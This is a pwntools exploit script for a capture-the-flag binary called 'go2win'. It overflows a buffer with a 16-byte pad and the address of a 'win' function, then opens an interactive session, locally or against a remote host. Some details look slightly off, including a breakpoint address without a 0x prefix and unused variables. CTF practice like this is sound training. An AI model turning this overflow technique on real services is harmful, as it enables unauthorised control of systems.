#!/usr/bin/env python3

from pwn import *

elf = ELF("./go2win")
libc = elf.libc

context.binary = elf

gdbscript='''
break *0047fa6b
'''

def conn(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([elf.path] + argv, *a, **kw)

def main():
    r = conn() 
    print(f"win addr : {hex(elf.sym.main.win)}")
    #ret = elf.search(asm('ret'))
    ret = pack(0x000000000040103d)
    payload = cyclic(16) + pack(elf.sym.main.win)
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()

